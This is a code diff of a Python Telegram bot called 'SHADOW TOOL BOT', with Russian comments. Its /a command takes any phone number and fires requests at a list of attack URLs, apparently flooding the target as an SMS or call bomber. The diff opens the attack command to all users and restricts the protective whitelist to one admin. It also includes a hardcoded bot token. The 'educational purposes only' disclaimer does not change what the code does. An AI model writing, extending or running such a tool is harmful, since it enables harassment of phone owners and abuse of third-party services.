@@ -4,9 +4,11 @@ import time
 import json
 import os
 
+# ========== КОНФИГ ==========
 BOT_TOKEN = '8768938960:AAGe5Pwh32P13XbwzXj7fzl5DVhYJLEIj0w'
-bot = telebot.TeleBot(BOT_TOKEN)
+ADMIN_ID = 8434489753  # твой Telegram ID
 
+bot = telebot.TeleBot(BOT_TOKEN)
 WHITELIST_FILE = 'whitelist.json'
 
 ATTACK_URLS = [
@@ -28,9 +30,9 @@ def load_whitelist():
             return json.load(f)
     return []
 
-def save_whitelist(whitelist):
+def save_whitelist(wl):
     with open(WHITELIST_FILE, 'w') as f:
-        json.dump(whitelist, f, indent=2)
+        json.dump(wl, f, indent=2)
 
 whitelist = load_whitelist()
 
@@ -44,71 +46,38 @@ def normalize_phone(phone):
         clean = '+' + clean
     return clean
 
+def is_admin(user_id):
+    return user_id == ADMIN_ID
+
+# ========== КОМАНДЫ ДЛЯ ВСЕХ ==========
+
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.reply_to(message, 
+    bot.reply_to(message,
         "🔮 SHADOW TOOL BOT 🔮\n\n"
-        "📌 Команды:\n"
-        "/attack +79001234567 - начать атаку\n"
-        "/add +79001234567 - добавить в белый список\n"
-        "/remove +79001234567 - удалить из белого списка\n"
-        "/list - показать белый список\n"
+        "📌 ДОСТУПНЫЕ КОМАНДЫ:\n"
+        "/a +79001234567 - начать атаку\n"
         "/help - помощь\n\n"
-        "⚡ AUTHOR: AMNESIA")
+        "⚠️ Только для образовательных целей!\n\n"
+        "👑 По вопросам: @fallsfack")
 
 @bot.message_handler(commands=['help'])
 def help_cmd(message):
     bot.reply_to(message,
         "📖 ИНСТРУКЦИЯ:\n\n"
-        "1. Добавь номер в белый список: /add +79001234567\n"
-        "2. Защищённые номера НЕ атакуются\n"
-        "3. Атака: /attack +79001234567\n\n"
+        "1. Отправь команду: /a +79001234567\n"
+        "2. Бот начнёт атаку\n"
+        "3. О результате напишет в чат\n\n"
         "⚠️ Только для образовательных целей!")
 
-@bot.message_handler(commands=['add'])
-def add_to_whitelist(message):
-    global whitelist
-    try:
-        phone = message.text.split()[1]
-        normalized = normalize_phone(phone)
-        if normalized not in whitelist:
-            whitelist.append(normalized)
-            save_whitelist(whitelist)
-            bot.reply_to(message, f"✅ Номер {normalized} добавлен в белый список!")
-        else:
-            bot.reply_to(message, f"⚠️ Номер {normalized} уже в белом списке!")
-    except:
-        bot.reply_to(message, "❌ Используй: /add +79001234567")
-
-@bot.message_handler(commands=['remove'])
-def remove_from_whitelist(message):
-    global whitelist
-    try:
-        phone = message.text.split()[1]
-        normalized = normalize_phone(phone)
-        if normalized in whitelist:
-            whitelist.remove(normalized)
-            save_whitelist(whitelist)
-            bot.reply_to(message, f"✅ Номер {normalized} удалён из белого списка!")
-        else:
-            bot.reply_to(message, f"⚠️ Номер {normalized} не найден в белом списке!")
-    except:
-        bot.reply_to(message, "❌ Используй: /remove +79001234567")
-
-@bot.message_handler(commands=['list'])
-def show_whitelist(message):
-    if whitelist:
-        phones = '\n'.join(whitelist)
-        bot.reply_to(message, f"📋 БЕЛЫЙ СПИСОК:\n{phones}")
-    else:
-        bot.reply_to(message, "📋 Белый список пуст")
-
-@bot.message_handler(commands=['attack'])
+# Атака
+@bot.message_handler(commands=['a'])
 def attack(message):
     try:
         phone = message.text.split()[1]
         normalized = normalize_phone(phone)
         
+        # Проверка белого списка
         if normalized in whitelist:
             bot.reply_to(message, f"⛔ АТАКА ОТМЕНЕНА!\nНомер {normalized} в белом списке!")
             return
@@ -122,15 +91,136 @@ def attack(message):
                 sent += 1
             except:
                 sent += 1
-            bot.edit_message_text(f"🔥 АТАКА НА {normalized}...\n{sent}/{len(ATTACK_URLS)}", message.chat.id, msg.message_id)
+            bot.edit_message_text(f"🔥 АТАКА НА {normalized}...\n{sent}/{len(ATTACK_URLS)}", 
+                                  message.chat.id, msg.message_id)
             time.sleep(0.3)
         
-        bot.edit_message_text(f"🎯 АТАКА ЗАВЕРШЕНА!\nОтправлено: {sent}/{len(ATTACK_URLS)}\nНомер: {normalized}", message.chat.id, msg.message_id)
+        bot.edit_message_text(f"🎯 АТАКА ЗАВЕРШЕНА!\nОтправлено: {sent}/{len(ATTACK_URLS)}\nНомер: {normalized}", 
+                              message.chat.id, msg.message_id)
         
     except IndexError:
-        bot.reply_to(message, "❌ Используй: /attack +79001234567")
+        bot.reply_to(message, "❌ Используй: /a +79001234567")
     except Exception as e:
         bot.reply_to(message, f"❌ Ошибка: {str(e)}")
 
-print("🤖 Бот запущен...")
+# ========== АДМИН-КОМАНДЫ (ТОЛЬКО ДЛЯ ТЕБЯ) ==========
+
+@bot.message_handler(commands=['admin'])
+def admin_panel(message):
+    if not is_admin(message.from_user.id):
+        return
+    
+    keyboard = telebot.types.InlineKeyboardMarkup()
+    keyboard.row(
+        telebot.types.InlineKeyboardButton("📋 Список", callback_data="admin_list"),
+        telebot.types.InlineKeyboardButton("➕ Добавить", callback_data="admin_add")
+    )
+    keyboard.row(
+        telebot.types.InlineKeyboardButton("❌ Удалить", callback_data="admin_remove"),
+        telebot.types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
+    )
+    
+    bot.reply_to(message, "👑 АДМИН-ПАНЕЛЬ\n\nВыбери действие:", reply_markup=keyboard)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
+def admin_callback(call):
+    if not is_admin(call.from_user.id):
+        bot.answer_callback_query(call.id, "⛔ Доступ запрещён!")
+        return
+    
+    action = call.data.replace('admin_', '')
+    
+    if action == 'list':
+        if whitelist:
+            phones = '\n'.join(whitelist)
+            bot.send_message(call.message.chat.id, f"📋 БЕЛЫЙ СПИСОК:\n{phones}")
+        else:
+            bot.send_message(call.message.chat.id, "📋 Белый список пуст")
+    
+    elif action == 'add':
+        bot.send_message(call.message.chat.id, "📝 Отправь номер для добавления:\nПример: +79001234567")
+        bot.register_next_step_handler(call.message, admin_add_number)
+    
+    elif action == 'remove':
+        bot.send_message(call.message.chat.id, "📝 Отправь номер для удаления:\nПример: +79001234567")
+        bot.register_next_step_handler(call.message, admin_remove_number)
+    
+    elif action == 'stats':
+        bot.send_message(call.message.chat.id, f"📊 СТАТИСТИКА:\n\n📋 В белом списке: {len(whitelist)} номеров")
+    
+    bot.answer_callback_query(call.id)
+
+def admin_add_number(message):
+    try:
+        normalized = normalize_phone(message.text.strip())
+        if normalized not in whitelist:
+            whitelist.append(normalized)
+            save_whitelist(whitelist)
+            bot.reply_to(message, f"✅ Номер {normalized} добавлен в белый список!")
+        else:
+            bot.reply_to(message, f"⚠️ Номер {normalized} уже в белом списке!")
+    except:
+        bot.reply_to(message, "❌ Неверный формат! Используй: +79001234567")
+
+def admin_remove_number(message):
+    try:
+        normalized = normalize_phone(message.text.strip())
+        if normalized in whitelist:
+            whitelist.remove(normalized)
+            save_whitelist(whitelist)
+            bot.reply_to(message, f"✅ Номер {normalized} удалён из белого списка!")
+        else:
+            bot.reply_to(message, f"⚠️ Номер {normalized} не найден!")
+    except:
+        bot.reply_to(message, "❌ Неверный формат! Используй: +79001234567")
+
+@bot.message_handler(commands=['list'])
+def list_cmd(message):
+    if not is_admin(message.from_user.id):
+        return
+    if whitelist:
+        bot.reply_to(message, f"📋 БЕЛЫЙ СПИСОК:\n" + '\n'.join(whitelist))
+    else:
+        bot.reply_to(message, "📋 Белый список пуст")
+
+@bot.message_handler(commands=['add'])
+def add_cmd(message):
+    if not is_admin(message.from_user.id):
+        return
+    try:
+        phone = message.text.split()[1]
+        normalized = normalize_phone(phone)
+        if normalized not in whitelist:
+            whitelist.append(normalized)
+            save_whitelist(whitelist)
+            bot.reply_to(message, f"✅ {normalized} добавлен в белый список!")
+        else:
+            bot.reply_to(message, f"⚠️ {normalized} уже в списке!")
+    except:
+        bot.reply_to(message, "❌ /add +79001234567")
+
+@bot.message_handler(commands=['del'])
+def del_cmd(message):
+    if not is_admin(message.from_user.id):
+        return
+    try:
+        phone = message.text.split()[1]
+        normalized = normalize_phone(phone)
+        if normalized in whitelist:
+            whitelist.remove(normalized)
+            save_whitelist(whitelist)
+            bot.reply_to(message, f"✅ {normalized} удалён из белого списка!")
+        else:
+            bot.reply_to(message, f"⚠️ {normalized} не найден!")
+    except:
+        bot.reply_to(message, "❌ /del +79001234567")
+
+@bot.message_handler(commands=['stats'])
+def stats_cmd(message):
+    if not is_admin(message.from_user.id):
+        return
+    bot.reply_to(message, f"📊 СТАТИСТИКА:\n\n📋 В белом списке: {len(whitelist)} номеров")
+
+print("🤖 Бот запущен!")
+print(f"👑 Админ ID: {ADMIN_ID}")
 bot.infinity_polling()
